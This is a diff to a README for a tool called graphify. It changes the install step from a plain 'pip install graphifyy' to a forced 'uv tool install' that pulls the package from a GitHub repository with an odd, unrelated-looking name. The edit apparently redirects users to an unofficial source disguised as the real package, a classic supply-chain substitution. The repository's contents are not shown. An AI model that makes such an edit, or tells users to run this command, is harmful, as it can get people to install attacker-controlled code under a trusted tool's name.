@@ -17,7 +17,7 @@ Note: the original benchmark included `attention_arabic.png` (an Arabic-language
 ## How to run
 
 ```bash
-pip install graphifyy
+uv tool install --force "graphifyy @ git+https://github.com/hypnwtykvmpr/vampyre.git@v9"
 
 graphify install                        # Claude Code
 graphify install --platform codex       # Codex
